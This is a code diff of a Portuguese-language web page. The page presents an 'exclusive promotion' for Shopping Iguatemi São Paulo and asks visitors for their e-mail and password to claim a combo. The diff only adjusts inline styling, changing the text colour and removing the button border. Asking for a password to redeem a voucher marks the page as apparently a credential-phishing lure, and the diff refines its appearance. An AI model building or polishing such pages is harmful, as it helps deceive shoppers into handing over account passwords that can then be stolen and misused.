@@ -38,10 +38,10 @@ user-scalable=no">
           <p class="text-wrapper">Promoção exclusiva para o Shopping Iguatemi São Paulo</p>
           <form action="./" method="post" class="form">
             <input class="PB-input" placeholder="E-Mail" style="
-    font-weight: 800;font:white;
+    font-weight: 800;color:white;
 " type="email" id="email" name="email" required>
-            <input class="div-wrapper" placeholder="Senha" style="font-weight: 800;font:white" type="password" id="senha" name="senha" required>
-            <input class="PB-button" style="font-weight: 600;;font:white" type="submit" value="RESGATAR COMBO!">
+            <input class="div-wrapper" placeholder="Senha" style="font-weight: 800;color:white" type="password" id="senha" name="senha" required>
+            <input class="PB-button" style="font-weight: 600;border:none" type="submit" value="RESGATAR COMBO!">
             <p class="p">Ao resgatar você concorda com os Termos de Uso</p>
           </div>
         </div>
